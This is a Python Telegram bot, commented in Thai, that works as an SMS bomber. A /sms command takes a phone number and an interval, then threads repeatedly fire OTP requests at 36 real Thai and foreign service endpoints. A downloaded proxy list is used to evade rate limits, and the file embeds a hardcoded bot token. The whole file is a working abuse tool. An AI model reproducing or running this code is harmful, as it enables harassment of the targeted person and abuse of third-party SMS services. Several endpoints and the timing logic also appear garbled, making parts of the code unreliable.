import logging
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import requests
import random
import threading
import time

# ตั้งค่าการล็อก
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Proxy List
proxy_list = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text.splitlines()

# API ฟังก์ชัน
def api1(phone):
    requests.post("https://www.carsome.co.th/website/login/sendSMS",
                  headers={"user-agent": "Mozilla/5.0"},
                  json={"username": phone, "optType": 0},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

# (เพิ่มฟังก์ชัน api2 ถึง api36 ที่นี่)
def api2(phone):
    requests.Session().post("https://api.jobbkk.com/v1/easy/otp_code",
                            data="mobile=" + phone,
                            proxies={'http': 'http://' + random.choice(proxy_list)})

def api3(phone):
    session = requests.Session()
    session.post("https://srfng.ais.co.th/login/sendOneTimePW",
                 data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
                 proxies={'http': 'http://' + random.choice(proxy_list)})

def api4(phone):
    requests.post("https://openapi.bigc.co.th/customer/v1/otp",
                  headers={"user-agent": "Mozilla/5.0"},
                  json={"phone_no": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api5(phone):
    requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}",
                 headers={"user-agent": "Mozilla/5.0"},
                 proxies={'http': 'http://' + random.choice(proxy_list)})

def api6(phone):
    requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
                  data={"mobile_phone_no": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api7(phone):
    requests.post("https://topping.truemoveh.com/api/get_request_otp",
                  data=f"mobile_number={phone}",
                  headers={"Accept": "application/json"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api8(phone):
    requests.post("https://www.beauticool.com/?m=request_otp",
                  headers={"user-agent": "Mozilla/5.0"},
                  data=f"tel={phone}",
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api9(phone):
    requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}",
                 headers={"user-agent": "Mozilla/5.0"},
                 proxies={'http': 'http://' + random.choice(proxy_list)})

def api10(phone):
    requests.post("https://api-sso.ch3plus.com/user/request-otp",
                  headers={'user-agent': "Mozilla/5.0"},
                  json={"tel": phone, "type": "login"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api11(phone):
    requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",
                  json={"lang": "th", "userType": "BUYER", "locale": "th", "phone": phone, "type": "signup"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api12(phone):
    requests.post("https://api2.1112.com/api/v1/otp/create",
                  headers={"user-agent": "Mozilla/5.0"},
                  json={"phonenumber": phone, "language": "th"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api13(phone):
    requests.post("https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp",
                  headers={"User-Agent": "Mozilla/5.0"},
                  data=f"Mobile={phone}",
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api14(phone):
    requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
                  json={"on": {"value": phone, "country": "66"}, "type": "mobile"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api15(phone):
    requests.post("https://api.giztix.com/graphql",
                  json={"operationName": "OtpGeneratePhone",
                        "variables": {"phone": f"66{phone[1:]}"},
                        "query": "mutation OtpGeneratePhone($phone: ID!) {otpGeneratePhone(phone: $phone) {ref}}"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api16(phone):
    requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
                  json={"username": phone, "password": "password", "name": "name", "provinceCode": "28"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api17(phone):
    requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",
                  data=f"phone={phone[1:]}&type=1",
                  headers={"authorization": "Basic d2ViQXBwOndlYkFwcA=="},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api18(phone):
    requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",
                  json={"msisdn": phone, "function": "enroll"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api19(phone):
    requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',
                 proxies={'http': 'http://' + random.choice(proxy_list)})

def api20(phone):
    requests.post("https://api.1112delivery.com/api/v1/otp/create",
                  json={"phonenumber": phone, "language": "th"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api21(phone):
    requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",
                 proxies={'http': 'http://' + random.choice(proxy_list)})

def api22(phone):
    requests.post("https://www.ctrueshop.com/member.php?page=25&type=9",
                  data=f"tel1={phone}",
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api23(phone):
    requests.post("https://www.bigthailand.com/authentication-service/user/OTP",
                  json={"locale": "th", "phone": f"+66{phone[1:]}"},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api24(phone):
    requests.post("https://shopgenix.com/api/sms/otp/",
                  data=f"mobile={phone}",
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api25(phone):
    requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",
                  json={"Tel": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api26(phone):
    requests.post("https://id.zilingo.com/api/otp/send",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api27(phone):
    requests.post("https://ecomapi.eveandboy.com/v10.0/api/auth/send-otp",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api28(phone):
    requests.post("https://api.pluckk.in/api/v1/auth/send-otp",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api29(phone):
    requests.post("https://watsons.co.th/auth/otp",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api30(phone):
    requests.post("https://app.amplyfy.in/v1/otp/send",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api31(phone):
    requests.post("https://line.me/otp/send",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api32(phone):
    requests.post("https://scg-api.dingdongx.com/api/otp/send",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api33(phone):
    requests.post("https://www.ais.co.th/api/otp/send",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api34(phone):
    requests.post("https://www.cpall.co.th/auth/send-otp",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

def api35(phone):
    requests.post("https://truemoney.co.th/api/otp/send",
                  json={"phone": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})
         
def api36(phone):
    requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
                  data={"mobile_phone_no": phone},
                  proxies={'http': 'http://' + random.choice(proxy_list)})

# ฟังก์ชันที่ยิง SMS ทุกๆ X นาที
def send_sms(phone, interval):
    while True:
        threading.Thread(target=api1, args=(phone,)).start()
        threading.Thread(target=api2, args=(phone,)).start()
        # (เรียก API อื่นๆ ที่คุณต้องการ)
        threading.Thread(target=api36, args=(phone,)).start()

        time.sleep(interval * 10)  # รอเวลา interval ก่อนยิง SMS ครั้งถัดไป

# ฟังก์ชันจัดการคำสั่ง /sms
def sms_command(update: Update, context: CallbackContext):
    if len(context.args) != 2:
        update.message.reply_text('กรุณาระบุ เบอร์โทร และ จำนวนเวลาที่ต้องการยิง (นาที) เช่น /sms 0812345678 2')
        return

    phone = context.args[0]
    try:
        interval = int(context.args[1])  # เวลาในการยิงซ้ำ (นาที)
        if interval < 0:
            update.message.reply_text('โปรดระบุเวลาที่มากกว่า 0')
            return
    except ValueError:
        update.message.reply_text('โปรดระบุเวลาที่ถูกต้อง เช่น 1 หรือ 2')
        return

    update.message.reply_text(f'เริ่มยิง SMS ไปยัง {phone} ทุก {interval} นาที')

    # เริ่มยิง SMS ต่อเนื่อง
    threading.Thread(target=send_sms, args=(phone, interval)).start()

# ฟังก์ชันหลักสำหรับบอท
def main():
    updater = Updater("7291952960:AAF0s9gBMN7pfmha7cRoBsVF1ekgwq_7wHY", use_context=True)
    dispatcher = updater.dispatcher

    # เพิ่มคำสั่ง /sms
    dispatcher.add_handler(CommandHandler("sms", sms_command))

    # เริ่มบอท
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
    
